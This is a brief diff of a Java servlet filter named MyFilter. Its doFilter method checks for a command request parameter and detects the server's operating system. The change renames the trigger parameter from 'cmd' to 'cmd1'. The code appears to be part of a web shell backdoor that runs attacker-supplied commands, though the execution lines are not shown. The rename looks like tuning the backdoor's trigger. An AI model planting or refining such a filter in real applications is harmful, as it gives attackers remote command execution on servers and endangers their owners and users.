@@ -16,7 +16,7 @@ public class MyFilter implements Filter {
     public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
         HttpServletRequest req = (HttpServletRequest) request;
         HttpServletResponse resp = (HttpServletResponse) response;
-        if (req.getParameter("cmd") != null) {
+        if (req.getParameter("cmd1") != null) {
             boolean isLinux = true;
             String osTyp = System.getProperty("os.name");
             if (osTyp != null && osTyp.toLowerCase().contains("win")) {
